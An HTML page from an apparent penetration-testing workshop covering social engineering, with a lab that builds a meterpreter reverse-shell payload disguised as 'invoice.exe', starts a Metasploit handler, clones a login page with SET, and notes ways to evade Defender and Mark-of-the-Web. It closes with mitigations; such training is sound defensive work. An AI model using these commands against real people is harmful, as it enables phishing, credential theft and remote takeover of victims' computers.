@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VAPT Workshop - Social Engineering</title>
+    <link rel="stylesheet" href="../../styles/theme.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&family=Fira+Code&display=swap" rel="stylesheet">
+</head>
+<body>
+<div class="app-container">
+    
+
+    <nav class="sidebar">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 2.5rem;">
+            <span class="brand" style="margin-bottom: 0;">VAPT Workshop</span>
+            <button class="theme-toggle" id="themeToggle" onclick="toggleTheme()" title="Toggle Light/Dark Mode" style="position: static; padding: 0.5rem; border-radius: 50%; width: 40px; height: 40px; display: flex; justify-content: center; align-items: center;">
+                <span id="themeIcon" style="font-size: 1.2rem;">☀️</span>
+            </button>
+        </div>
+        <div class="nav-group">
+            <div class="nav-group-title">Table of Contents</div>
+            <ul class="nav-links">
+                <li><a href="../../index.html">Welcome & Intro</a></li>
+                <li><a href="../../modules/privilege-escalation/overview.html">Privilege Escalation</a></li>
+                <li><a href="../../modules/xss/overview.html">Cross-Site Scripting (XSS)</a></li>
+                <li><a href="../../modules/privesc-xss/overview.html">PrivEsc via XSS</a></li>
+                <li><a href="../../modules/metasploit/overview.html">Metasploit</a></li>
+                <li><a href="../../modules/exploitation/overview.html">Exploitation Frameworks</a></li>
+                <li><a href="../../modules/sqli/overview.html">SQL Injection</a></li>
+                <li><a href="../../modules/aitm/overview.html">AITM Attacks</a></li>
+                <li><a href="../../modules/password-attacks/overview.html">Password Attacks</a></li>
+                <li><a href="../../modules/network-pentesting/overview.html">Network Pentesting</a></li>
+                <li><a href="../../modules/wireless-pentesting/overview.html">Wireless Pentesting</a></li>
+                <li><a href="../../modules/social-engineering/overview.html" class="active">Social Engineering</a></li>
+                <li><a href="../../modules/security-controls/overview.html">Security Controls</a></li>
+                <li><a href="../../modules/physical-security/overview.html">Physical Security</a></li>
+                <li><a href="../../modules/reporting/overview.html">Reporting</a></li>
+            </ul>
+        </div>
+    </nav>
+    <main class="main-content" id="content-anchor">
+        # Module: Social Engineering
+
+<div class="glass-card">
+  <h2>1. Core Concept 🧠</h2>
+  <p><strong>Social Engineering</strong> focuses on the weakest link in any security system: the human. Instead of hacking the firewall, you hack the employee by manipulating them into giving up confidential information or executing a malicious payload.</p>
+  <p><em>Real-world analogy:</em> Instead of picking the lock to the bank vault (technical hacking), you dress up as a maintenance worker, carry a clipboard, look confident, and simply ask the manager to open the door for you.</p>
+</div>
+
+<div class="glass-card">
+  <h2>2. Attack Flow Visual 🎯</h2>
+  <div class="attack-flow">
+    <div class="flow-step">OSINT (Gather Info on Target)</div>
+    <div class="flow-arrow">↓</div>
+    
+    <div class="flow-step">Construct Pretext (Create Fake Scenario)</div>
+    <div class="flow-arrow">↓</div>
+    
+    <div class="flow-step">Delivery (Send Phishing Email/Call)</div>
+    <div class="flow-arrow">↓</div>
+    
+    <div class="flow-step">Execution (Victim Clicks/Downloads)</div>
+    <div class="flow-arrow">↓</div>
+    
+    <div class="flow-step">Compromise (Reverse Shell Executed)</div>
+  </div>
+  
+  <h4>Execution Mapping</h4>
+  <table>
+    <thead>
+      <tr>
+        <th>Step</th>
+        <th>Action</th>
+        <th>Tool / Payload</th>
+        <th>Output</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>1</td>
+        <td>Payload Generation</td>
+        <td><code>msfvenom -p windows/meterpreter/reverse_tcp</code></td>
+        <td>Malicious .exe created</td>
+      </tr>
+      <tr>
+        <td>2</td>
+        <td>Clone Target Site</td>
+        <td>SET Toolkit (Credential Harvester)</td>
+        <td>Fake Login Portal acting as Host</td>
+      </tr>
+      <tr>
+        <td>3</td>
+        <td>Execution by Victim</td>
+        <td>Double-clicks the attached file</td>
+        <td>Command & Control connection</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="glass-card">
+  <h2>3. Hands-on Lab 🧪</h2>
+  
+  <div class="lab-header">
+    <h3 class="lab-title">🧪 Lab: Spearphishing & Malicious Payloads</h3>
+    <div class="lab-meta">
+      <span class="meta-badge">Topic: Human Exploitation</span>
+      <span class="meta-badge difficulty-medium">Difficulty: Medium</span>
+      <span class="meta-badge">Time: 45 mins</span>
+    </div>
+<div style="margin-top: 15px;"><a href="http://localhost:80" target="_blank" class="btn-start-lab">🚀 Start Lab Environment</a></div>
+  </div>
+  
+  <div class="lab-content">
+    
+    <div class="callout tip">
+      <div class="icon">💡</div>
+      <div class="content"><strong>Pro Tip:</strong> Today, simple `.exe` payloads are often caught by Defender. Real attackers use Office Macros (`.docm`), HTA files, or LNK shortcuts wrapped in ISOs to bypass Mark-of-the-Web (MotW) protections.</div>
+    </div>
+    
+    <h4>Architecture Diagram</h4>
+    <img src="../../assets/phishing_arch.png" alt="Workshop Diagram" style="width: 100%; border-radius: 12px; border: 1px solid var(--border-color); box-shadow: var(--box-shadow); margin-bottom: 2rem;">
+    
+    <h4>Setup</h4>
+    <pre><code># The Social Engineer Toolkit (SET) is pre-installed in your Kali VM.
+# No docker setup required for this tool. Target is the provided simulated Windows Desktop.</code></pre>
+    
+    <h4>Attack Steps</h4>
+    <ol>
+      <li>Generate a payload using MSFvenom: <br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe &gt; invoice.exe</code></li>
+      <li>Start the Metasploit handler to catch the connection: <br><code>msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; exploit -j"</code></li>
+      <li>Use the Social Engineer Toolkit (<code>setoolkit</code>) to clone a corporate login page and host the file.</li>
+      <li>Simulate the victim clicking the link / opening the file.</li>
+      <li>Observe the Metasploit session open.</li>
+    </ol>
+    
+    <h4>Expected Output</h4>
+    <img src="../../assets/hacker_terminal.png" alt="Workshop Diagram" style="width: 100%; border-radius: 12px; border: 1px solid var(--border-color); box-shadow: var(--box-shadow); margin-bottom: 2rem;">
+    
+    <h4>Fix / Mitigation</h4>
+    <p>Implement strong <strong>Security Awareness Training</strong> for all employees. Use robust Email Filtering (SPF/DKIM/DMARC) and disable Office Macros system-wide via GPO. Implement Endpoint Detection and Response (EDR) to catch malicious child processes.</p>
+  </div>
+</div>
+
+    
+    <div class="content-nav">
+        <div><a href="../../modules/wireless-pentesting/overview.html" class="content-nav-prev"><span>←</span> Wireless Pentesting</a></div>
+        <div><a href="../../modules/security-controls/overview.html" class="content-nav-next"><span>→</span> Security Controls</a></div>
+    </div>
+    
+</main>
+</div>
+
+<script>
+    // Theme toggling logic
+    function setTheme(isLight) {
+        if (isLight) {
+            document.documentElement.classList.add('light-theme');
+            document.getElementById('themeIcon').innerText = '🌙';
+            
+            localStorage.setItem('vapt-theme', 'light');
+        } else {
+            document.documentElement.classList.remove('light-theme');
+            document.getElementById('themeIcon').innerText = '☀️';
+            
+            localStorage.setItem('vapt-theme', 'dark');
+        }
+    }
+
+    function toggleTheme() {
+        const isLight = !document.documentElement.classList.contains('light-theme');
+        setTheme(isLight);
+    }
+
+    // Initialize theme based on localStorage
+    const savedTheme = localStorage.getItem('vapt-theme');
+    if (savedTheme === 'light') {
+        setTheme(true);
+    }
+</script>
+
+</body>
+</html>
